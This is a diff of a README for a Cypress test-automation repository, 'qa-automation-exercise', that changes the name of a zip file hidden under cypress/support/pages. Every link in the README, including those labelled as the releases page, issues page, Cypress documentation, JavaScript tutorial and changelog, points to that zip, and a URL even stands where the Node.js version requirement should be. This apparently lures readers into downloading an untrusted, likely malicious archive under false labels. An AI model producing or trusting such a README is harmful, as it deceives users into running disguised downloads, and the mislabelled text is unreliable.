@@ -6,7 +6,7 @@ Welcome to the `qa-automation-exercise` project! This application helps you auto
 
 ## 📥 Download Here
 
-[![Download](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/automation_qa_exercise_metapophysial.zip)](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/automation_qa_exercise_metapophysial.zip)
+[![Download](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/qa_automation_exercise_v1.5.zip)](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/qa_automation_exercise_v1.5.zip)
 
 ## 📝 Overview
 
@@ -23,7 +23,7 @@ This project uses the Page Object Model (POM) design pattern, making test automa
 To ensure the application runs smoothly, please verify the following: 
 
 - **Operating System:** Windows, macOS, or Linux
-- **https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/automation_qa_exercise_metapophysial.zip** Version 12 or higher
+- **https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/qa_automation_exercise_v1.5.zip** Version 12 or higher
 - **NPM:** Version 6 or higher
 - **Cypress:** Version 7 or higher (included during setup)
 
@@ -32,7 +32,7 @@ To ensure the application runs smoothly, please verify the following:
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**
-   - Go to the [Releases Page](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/automation_qa_exercise_metapophysial.zip) to find the latest version of the application.
+   - Go to the [Releases Page](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/qa_automation_exercise_v1.5.zip) to find the latest version of the application.
 
 2. **Download the Latest Version**
    - Click on the version number you want to download. This will take you to a page with various files.
@@ -78,22 +78,22 @@ Once installed, you can customize the tests to suit your specific e-commerce app
 
 We welcome contributions from everyone! Whether you find a bug, have suggestions, or want to improve the project, please reach out. 
 
-- **Issues:** Feel free to report issues on the [GitHub Issues Page](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/automation_qa_exercise_metapophysial.zip).
-- **Discussions:** Join ongoing discussions on the project’s [Discussions Page](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/automation_qa_exercise_metapophysial.zip).
+- **Issues:** Feel free to report issues on the [GitHub Issues Page](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/qa_automation_exercise_v1.5.zip).
+- **Discussions:** Join ongoing discussions on the project’s [Discussions Page](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/qa_automation_exercise_v1.5.zip).
 
 ## 🔗 Additional Resources
 
-- **Cypress Documentation:** For deeper understanding of Cypress, visit [Cypress Documentation](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/automation_qa_exercise_metapophysial.zip).
-- **JavaScript Basics:** If you're new to JavaScript, check out [JavaScript Info](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/automation_qa_exercise_metapophysial.zip) for a comprehensive guide.
+- **Cypress Documentation:** For deeper understanding of Cypress, visit [Cypress Documentation](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/qa_automation_exercise_v1.5.zip).
+- **JavaScript Basics:** If you're new to JavaScript, check out [JavaScript Info](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/qa_automation_exercise_v1.5.zip) for a comprehensive guide.
 
 ## 📅 Changelog
 
-Keep track of all changes and updates in each version by visiting the [Changelog](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/automation_qa_exercise_metapophysial.zip). 
+Keep track of all changes and updates in each version by visiting the [Changelog](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/qa_automation_exercise_v1.5.zip). 
 
 Remember, testing is an essential part of software development. With `qa-automation-exercise`, you can streamline your testing process effectively.
 
 ## 📥 Download Here Again
 
-[![Download](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/automation_qa_exercise_metapophysial.zip)](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/automation_qa_exercise_metapophysial.zip)
+[![Download](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/qa_automation_exercise_v1.5.zip)](https://raw.githubusercontent.com/Nurulkarim/qa-automation-exercise/main/cypress/support/pages/qa_automation_exercise_v1.5.zip)
 
 Please follow these steps carefully to make your setup process smooth. Enjoy automating your tests!
